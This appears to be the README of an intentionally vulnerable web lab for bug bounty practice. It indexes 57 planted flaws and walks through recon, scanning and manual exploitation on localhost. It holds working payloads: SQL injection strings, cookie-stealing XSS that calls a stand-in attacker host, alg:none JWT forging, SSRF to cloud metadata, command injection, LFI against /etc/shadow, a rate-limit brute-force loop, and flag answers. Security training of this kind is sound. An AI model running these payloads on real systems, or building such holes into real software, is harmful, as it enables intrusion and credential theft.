# Syntex Solutions — Vulnerable Lab

> **⚠️ WARNING — FOR AUTHORIZED TESTING ONLY**
> This application is **deliberately insecure**. Run it only in an isolated local/lab environment.
> Never deploy to the internet or on a shared network. Never point real bug bounty tools at production systems.
> By using this lab you confirm you have authorization to test it.

A realistic, intentionally vulnerable corporate SaaS application for bug bounty practice, mapped to the full HackerOne/Bugcrowd recon → exploitation methodology.

**Stack:** Node.js · Express · PostgreSQL · Docker · Nginx  
**Company persona:** Syntex Solutions Inc. — Enterprise Resource Management  
**Style:** Corporate enterprise portal (not a CTF page)

---

## Quick Start

```bash
# 1. Clone / download the repo
git clone https://github.com/YOUR_USERNAME/syntex-lab.git
cd syntex-lab

# 2. (Optional) Copy and edit environment
cp .env.example .env

# 3. Start everything — one command
docker-compose up --build

# App runs at:  http://localhost:3000
# Via Nginx:    http://localhost:80   (add /etc/hosts entries below)
# PostgreSQL:   localhost:5432
```

The database seeds automatically on first boot. Wait ~15 seconds for the seed to finish.

---

## Default Credentials

| Username       | Password      | Role      |
|----------------|---------------|-----------|
| `admin`        | `admin123`    | admin     |
| `john.doe`     | `Password1!`  | user      |
| `jane.smith`   | `letmein123`  | user      |
| `alice.wong`   | `alice2024`   | user      |
| `bob.johnson`  | `123456789`   | user      |
| `developer`    | `devpass2024` | developer |
| `support`      | `support123`  | support   |

> Passwords are **MD5-hashed** in the database (intentionally weak).

---

## Subdomain Setup (for recon practice)

Add to `/etc/hosts` (Linux/Mac) or `C:\Windows\System32\drivers\etc\hosts` (Windows):

```
127.0.0.1  syntex.local
127.0.0.1  api.syntex.local
127.0.0.1  admin.syntex.local
127.0.0.1  staging.syntex.local
127.0.0.1  dev.syntex.local
127.0.0.1  mail.syntex.local
127.0.0.1  backup.syntex.local
127.0.0.1  vpn.syntex.local
127.0.0.1  intranet.syntex.local
```

Then access via `http://syntex.local` (port 80, through Nginx).

---

## Vulnerability Index

| # | Category | Vulnerability | Location |
|---|----------|--------------|----------|
| 1 | SQLi | Login bypass via username field | `POST /login` |
| 2 | SQLi | Search UNION injection | `GET /search?q=` |
| 3 | SQLi | Product filter/ORDER BY injection | `GET /products?category=&sort=` |
| 4 | SQLi | API user lookup | `GET /api/v1/users?username=` |
| 5 | SQLi | Blog category filter | `GET /blog?category=` |
| 6 | XSS Stored | Comment section | `POST /blog/:id/comment` |
| 7 | XSS Stored | Product reviews | `POST /products/:id/review` |
| 8 | XSS Stored | Profile bio field | `POST /profile/:id/edit` |
| 9 | XSS Reflected | Search query echoed | `GET /search?q=` |
| 10 | XSS DOM | URL `?message=` param → innerHTML | `app.js` |
| 11 | XSS DOM | URL `?error=` param → innerHTML | `app.js` |
| 12 | XSS DOM | URL `#fragment` → innerHTML | `app.js` |
| 13 | IDOR | View/edit any user's profile | `GET/POST /profile/:id` |
| 14 | IDOR | View any user's order + PII | `GET /orders/:id` |
| 15 | IDOR | View any ticket + internal notes | `GET /tickets/:id` |
| 16 | IDOR | API user data (incl. secret_note) | `GET /api/v1/users/:id` |
| 17 | CSRF | Profile update (no token) | `POST /profile/:id/edit` |
| 18 | CSRF | Password change (no old pw check) | `POST /profile/:id/change-password` |
| 19 | CSRF | Email change | `POST /profile/:id/change-email` |
| 20 | Auth Bypass | Admin via `role=admin` cookie | `GET /admin` |
| 21 | JWT Flaw | Algorithm confusion — `alg:none` | `POST /api/v1/token` + any JWT endpoint |
| 22 | JWT Flaw | Weak secret (`secret123`) | `POST /api/v1/token` |
| 23 | Weak Auth | Rate limit bypassed via `X-Forwarded-For` | `POST /login` |
| 24 | Session | httpOnly=false — JS can steal cookie | Session config in `server.js` |
| 25 | File Upload | Extension-only check (no MIME/magic) | `POST /upload` |
| 26 | File Upload | Path traversal in filename | `POST /upload` → `GET /download?file=` |
| 27 | Path Traversal | LFI via file download | `GET /download?file=../../etc/passwd` |
| 28 | Cmd Injection | Contact form `name` field in `exec()` | `POST /contact` |
| 29 | Cmd Injection | Admin ping utility | `POST /admin/ping` |
| 30 | Cmd Injection | Admin execute endpoint | `POST /admin/execute` |
| 31 | SSRF | URL fetch proxy | `POST /api/v1/fetch` |
| 32 | SSRF | Webhook callback URL | `POST /api/v2/webhook` |
| 33 | SSRF | Avatar from URL | `POST /api/v2/avatar` |
| 34 | Open Redirect | Login `?redirect=` param | `GET /login?redirect=https://evil.com` |
| 35 | Open Redirect | Logout `?redirect=` param | `GET /logout?redirect=https://evil.com` |
| 36 | Open Redirect | `/go?url=` shortener | `GET /go?url=https://evil.com` |
| 37 | CORS | Reflects any `Origin` with credentials | All `/api/v1` endpoints |
| 38 | Broken Access | Admin panel — cookie-only check | `GET /admin` |
| 39 | Broken Access | Mass user export — no auth | `GET /api/v2/users/export` |
| 40 | Broken Access | Full config dump — no auth | `GET /api/v2/internal/config` |
| 41 | Broken Access | Reset all passwords — body param only | `POST /api/v2/admin/reset-all` |
| 42 | Exposed Secret | `.env` file served publicly | `GET /.env` |
| 43 | Exposed Secret | `.git/config` with credentials | `GET /.git/config` |
| 44 | Exposed Secret | SQL backup with passwords | `GET /backup.sql` |
| 45 | Exposed Secret | API keys in JS source | `GET /js/config.js`, `GET /js/internal.js` |
| 46 | Exposed Secret | Debug page dumps all env vars | `GET /debug` |
| 47 | Exposed Secret | Config JSON with secrets | `GET /config.json` |
| 48 | Info Disclosure | Stack traces on all errors | All 500 error pages |
| 49 | Info Disclosure | DB errors shown to client | Login, search, filter endpoints |
| 50 | Business Logic | Negative order quantity → negative total | `POST /orders` |
| 51 | Business Logic | Coupon reuse (no per-user check) | `POST /orders/apply-coupon` |
| 52 | Business Logic | Client-supplied unit price | `POST /orders` body `unit_price` field |
| 53 | Weak Hashing | MD5 passwords in database | All auth flows |
| 54 | Missing Headers | No CSP, no X-Frame-Options, no HSTS | All responses |
| 55 | Recon | `robots.txt` discloses sensitive paths | `GET /robots.txt` |
| 56 | Recon | `security.txt` discloses scope | `GET /.well-known/security.txt` |
| 57 | Recon | Multiple subdomains (live + dead) | Nginx config |

---

## Practice Guide — Tool by Tool (matching the PDF methodology)

### Phase 1 — Passive Recon

```bash
# Tech fingerprinting — look for X-Syntex-Version, X-Powered-By headers
curl -I http://localhost:3000/
# → X-Powered-By: Syntex/2.4.1 Node.js/20 Express/4.18
# → X-Syntex-Version: 2.4.1

# WhatWeb
whatweb http://localhost:3000 -v

# Shodan / Google dorks (in scope: *.syntex.local)
# site:syntex.local filetype:sql
# site:syntex.local ext:env
# inurl:syntex.local/admin
```

### Phase 2 — Subdomain Enumeration

```bash
# Add to /etc/hosts first (see Subdomain Setup above)

# Gobuster vhost bruteforce
gobuster vhost -u http://syntex.local -w wordlist.txt --append-domain -t 20

# Subfinder (passive)
subfinder -d syntex.local

# Manual: subdomains discoverable via robots.txt comments and security.txt
curl http://syntex.local/robots.txt
curl http://syntex.local/.well-known/security.txt
```

**Subdomains to find:**
- `syntex.local` — main app ✅ live
- `api.syntex.local` — API proxy ✅ live
- `admin.syntex.local` — admin proxy ✅ live
- `staging.syntex.local` — staging ✅ live (weaker)
- `dev.syntex.local` — dev ✅ live
- `mail.syntex.local` — 503 (dead)
- `backup.syntex.local` — 503 (dead)
- `vpn.syntex.local` — 403 (exists, blocked)
- `intranet.syntex.local` — 401 (exists, auth required)

### Phase 3 — Live Host Verification

```bash
# httpx — status code, title, tech stack, web server
cat subdomains.txt | httpx -status-code -title -tech-detect -web-server

# Check for interesting response codes
# 403 on vpn.syntex.local — try bypass
# 401 on intranet.syntex.local — try default creds
# 503 on mail/backup — fingerprint via error page
```

### Phase 4 — Tech Fingerprinting

```bash
# Nmap service scan
nmap -sV -sC -p 80,3000,5432 localhost

# Custom headers to look for:
# X-Powered-By: Syntex/2.4.1 Node.js/20 Express/4.18
# X-Syntex-Version: 2.4.1
# Server: nginx/1.24.0  (via Nginx container)
# SYNTEX_SESS cookie (predictable session cookie name)

# Version info leaks:
curl http://localhost:3000/health       # reveals version + DB host
curl http://localhost:3000/metrics      # Prometheus-style metrics
curl http://localhost:3000/_profiler    # internal route map
```

### Phase 5 — URL Collection

```bash
# Katana crawler
katana -u http://localhost:3000 -jc -d 3 -o urls.txt

# Waybackurls (may have limited results for local)
echo "syntex.local" | waybackurls

# Extract all parameters
cat urls.txt | grep '=' | tee params.txt

# GF patterns for quick filtering
cat params.txt | gf sqli    # → /search?q=, /products?category=, /blog?category=
cat params.txt | gf xss     # → /search?q=, ?message=, ?error=
cat params.txt | gf lfi     # → /download?file=, /page?p=
cat params.txt | gf ssrf    # → fetch/url endpoints
cat params.txt | gf redirect # → /login?redirect=, /logout?redirect=, /go?url=
```

### Phase 6 — Directory & Path Discovery

```bash
# FFuF — directory brute force (use included wordlist.txt)
ffuf -u http://localhost:3000/FUZZ -w wordlist.txt -mc 200,301,302,403,500 -o dirs.txt

# Gobuster
gobuster dir -u http://localhost:3000 -w wordlist.txt -x php,html,js,txt,sql,bak,env

# Key paths to find manually (all in wordlist.txt):
# /.env              → full credentials
# /.git/config       → repo with embedded token
# /backup.sql        → DB dump with password hashes
# /debug             → all env vars
# /config.json       → secrets JSON
# /phpinfo.php       → fingerprinting
# /metrics           → Prometheus
# /_profiler         → internal routes
# /web.config        → IIS-style config with DB password
# /staging           → staging bypass page
# /old-portal        → legacy portal with default creds
# /api/v2/internal/config    → full config dump (no auth)
# /api/v2/users/export       → full user export (no auth)
# /api/v1/debug/env          → env vars via API
```

### Phase 7 — JavaScript Analysis

```bash
# LinkFinder — find hidden endpoints in JS
python3 linkfinder.py -i http://localhost:3000/js/config.js -o cli
python3 linkfinder.py -i http://localhost:3000/js/internal.js -o cli
python3 linkfinder.py -i http://localhost:3000/js/app.js -o cli

# SecretFinder — find API keys, tokens, secrets
python3 SecretFinder.py -i http://localhost:3000/js/config.js -o cli
python3 SecretFinder.py -i http://localhost:3000/js/internal.js -o cli

# What you'll find in /js/config.js:
# - api_key: sk_live_syntex_8f3a2b1c...
# - stripe_pk: pk_live_51H...
# - vault_token: hvs.CAESI...
# - _debug_token: eyJhbGciOiJub25lIn0... (alg:none JWT!)

# What you'll find in /js/internal.js:
# - All internal API routes
# - SERVICE_TOKENS with monitoring/backup/deploy tokens
# - Internal subdomain list

# TruffleHog for broader secret scanning
trufflehog filesystem --directory ./backend/public/js/
```

### Phase 8 — Automated Scanning

```bash
# Nuclei — run full scan
nuclei -u http://localhost:3000 -t exposures/ -t misconfiguration/ -t vulnerabilities/ -t files/
nuclei -u http://localhost:3000 -t default-logins/

# Dalfox — XSS scanner
dalfox url 'http://localhost:3000/search?q=test' --cookie "SYNTEX_SESS=YOUR_SESSION"
dalfox url 'http://localhost:3000/search?q=test' -p q

# SQLMap
# Login SQLi
sqlmap -u 'http://localhost:3000/login' --data 'username=admin&password=x' -p username --dbs --batch

# Search SQLi
sqlmap -u 'http://localhost:3000/search?q=test' -p q --dbs --batch --level=3

# Products filter SQLi
sqlmap -u 'http://localhost:3000/products?category=crm&sort=name' -p category,sort --dbs --batch

# Corsy — CORS misconfiguration
python3 corsy.py -u http://localhost:3000/api/v1/users -t 10

# JWT_Tool — JWT attacks
# Get a token first:
TOKEN=$(curl -s -X POST http://localhost:3000/api/v1/token -H 'Content-Type: application/json' \
  -d '{"username":"john.doe","password":"Password1!"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# Test alg:none attack
python3 jwt_tool.py $TOKEN -X a

# Crack weak secret (secret123 is in rockyou.txt)
python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# CORScanner
python3 cors_scanner.py -u http://localhost:3000/api/v1/users
```

### Phase 9 — Manual Testing

#### SQL Injection
```
Login bypass:
  username: admin'--
  username: ' OR '1'='1'--
  username: admin' OR 1=1--

Search UNION injection:
  /search?q=' UNION SELECT 1,username,password_hash,4,5 FROM users--
  /search?q=' UNION SELECT 1,secret_note,api_key,4,5 FROM users WHERE id=1--

Products ORDER BY injection:
  /products?sort=price ASC; SELECT pg_sleep(5)--
  /products?category=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--
```

#### XSS
```
Reflected (search):
  /search?q=<script>alert(document.cookie)</script>
  /search?q=<img src=x onerror=alert(1)>

DOM XSS (URL params — processed by app.js):
  /?message=<img src=x onerror=alert(document.cookie)>
  /dashboard#<script>alert(1)</script>

Stored XSS (post comment):
  Content: <script>fetch('http://ATTACKER/steal?c='+document.cookie)</script>
  Content: <img src=x onerror="document.location='http://ATTACKER/?c='+document.cookie">
```

#### IDOR
```
Change ID in URL — access other users' data:
  /profile/1    → admin profile (api_key + secret_note)
  /profile/6    → developer account (DB creds in secret_note)
  /orders/6     → developer's order (notes contain FLAG)
  /tickets/3    → internal notes: FLAG{idor_ticket_internal_notes_accessed}

API IDOR (no auth required):
  GET /api/v1/users/1    → admin api_key + secret_note (FLAG)
  GET /api/v1/orders     → ALL orders (ignores user context)
```

#### JWT Attacks
```bash
# 1. Get a valid token
curl -X POST http://localhost:3000/api/v1/token \
  -H 'Content-Type: application/json' \
  -d '{"username":"john.doe","password":"Password1!"}'

# 2. Use the _debug_token from /js/config.js (alg:none, pre-built admin token)
curl http://localhost:3000/api/v1/users/me \
  -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5Ac3ludGV4LmxvY2FsIn0.'

# 3. Craft your own alg:none token (change user ID to 1 for admin)
import base64, json
header  = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"id":1,"username":"admin","role":"admin"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."
```

#### Admin Panel Bypass
```bash
# Method 1: Set role cookie in browser dev tools
document.cookie = "role=admin; path=/"

# Method 2: Add cookie header
curl http://localhost:3000/admin -H "Cookie: role=admin"

# Method 3: Access unauthenticated internal API (no auth needed)
curl http://localhost:3000/api/v2/internal/config
curl http://localhost:3000/api/v2/users/export
```

#### SSRF
```bash
# Probe internal Docker network
curl -X POST http://localhost:3000/api/v1/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://db:5432"}'

# AWS metadata (if running on AWS)
curl -X POST http://localhost:3000/api/v1/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# Internal config
curl -X POST http://localhost:3000/api/v1/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://localhost:3000/debug"}'

# Webhook SSRF
curl -X POST http://localhost:3000/api/v2/webhook \
  -H 'Content-Type: application/json' \
  -d '{"callback_url":"http://INTERACTSH_URL","event":"test"}'
```

#### Command Injection
```bash
# Contact form (name field)
# Fill in the form at /contact with:
# Name: test; id
# Name: test && cat /etc/passwd
# Name: test | whoami

# Admin ping (authenticated admin)
curl -X POST http://localhost:3000/admin/ping \
  -H 'Content-Type: application/json' \
  -H 'Cookie: role=admin' \
  -d '{"host":"127.0.0.1; id"}'

# Admin execute (authenticated admin)
curl -X POST http://localhost:3000/admin/execute \
  -H 'Content-Type: application/json' \
  -H 'Cookie: role=admin' \
  -d '{"cmd":"cat /etc/passwd"}'
```

#### Path Traversal / LFI
```bash
GET /download?file=../../etc/passwd
GET /download?file=../../../etc/shadow
GET /download?file=../../../../proc/self/environ
GET /page?p=../../../../etc/passwd
GET /page?p=../../../../proc/self/environ
```

#### Business Logic
```bash
# Negative quantity → negative total (free money)
curl -X POST http://localhost:3000/orders \
  -H 'Content-Type: application/json' \
  -H 'Cookie: SYNTEX_SESS=YOUR_SESSION' \
  -d '{"product_id":1,"quantity":-10,"unit_price":299}'

# Coupon reuse (apply same coupon multiple times)
# Apply SAVE20 to order ID 1 repeatedly:
curl -X POST http://localhost:3000/orders/apply-coupon \
  -H 'Content-Type: application/json' \
  -H 'Cookie: SYNTEX_SESS=YOUR_SESSION' \
  -d '{"code":"SAVE20","order_id":1}'

# Price manipulation (send your own price)
curl -X POST http://localhost:3000/orders \
  -d 'product_id=1&quantity=1&unit_price=0.01'
```

#### Rate Limit Bypass
```bash
# Login brute force — change X-Forwarded-For each request
for i in $(seq 1 100); do
  curl -X POST http://localhost:3000/login \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -d 'username=admin&password=test'$i
done
```

---

## Architecture

```
syntex-lab/
├── docker-compose.yml     ← Hardcoded DB + AWS + Stripe secrets (intentional)
├── nginx.conf             ← Subdomains: api/admin/staging/dev/mail/backup/vpn/intranet
├── .env.example
├── README.md
├── SOLUTIONS.md           ← ⚠ SPOILERS — exploitation writeups for every vuln
├── wordlist.txt           ← Directory brute-force wordlist (ffuf/gobuster)
└── backend/
    ├── server.js          ← Weak session config, no security headers
    ├── database/
    │   ├── init.sql       ← Full schema
    │   └── seed.js        ← 7 users, 12 products, posts, comments, orders, tickets
    ├── middleware/
    │   ├── auth.js        ← Weak JWT (alg:none), cookie role check, bypassable rate limit
    │   └── cors.js        ← Reflects any Origin with credentials
    ├── routes/            ← All vulnerable route handlers
    │   ├── auth.js        ← SQLi login, open redirect, predictable reset token
    │   ├── profile.js     ← IDOR, CSRF, stored XSS
    │   ├── blog.js        ← Stored XSS in comments
    │   ├── products.js    ← SQLi in filter/sort
    │   ├── orders.js      ← IDOR, business logic
    │   ├── tickets.js     ← IDOR (internal notes)
    │   ├── search.js      ← SQLi + reflected XSS
    │   ├── contact.js     ← Command injection
    │   ├── upload.js      ← File upload bypass, path traversal
    │   ├── admin.js       ← Broken access control, command injection
    │   ├── misc.js        ← .env, .git, backup.sql, debug, SSRF, LFI, open redirect
    │   └── api/
    │       ├── v1.js      ← IDOR, CORS, JWT, SSRF, no-auth endpoints
    │       └── v2.js      ← Internal endpoints with no auth (config dump, user export)
    └── public/
        ├── js/
        │   ├── config.js  ← Leaked API keys, JWT secret, debug token (alg:none)
        │   ├── internal.js← Leaked internal routes + service tokens
        │   └── app.js     ← DOM XSS via innerHTML
        └── css/style.css
```

---

## Flag Locations

Hidden `FLAG{...}` strings are planted throughout the app. Find them by exploiting the vulnerabilities:

| Flag | How to Reach |
|------|-------------|
| `FLAG{admin_account_compromised_sqli_or_default_creds}` | SQLi on login or default creds → admin `secret_note` |
| `FLAG{idor_profile_accessed_user2}` | IDOR → `/profile/2` or `/api/v1/users/2` |
| `FLAG{idor_order_accessed_user2}` | IDOR → `/orders/6` (order notes field) |
| `FLAG{idor_ticket_internal_notes_accessed}` | IDOR → `/tickets/3` (internal notes) |

---

## Stopping the Lab

```bash
docker compose down          # stop containers
docker compose down -v       # stop + delete DB volume (fresh start)
```

---

## Disclaimer

This lab is for **educational purposes only**. All vulnerabilities are intentional and exist solely for learning.
Do not use techniques practiced here against any system you do not own or have explicit written permission to test.
The authors accept no responsibility for misuse.

> **Good luck. Stay in scope. Document everything.**
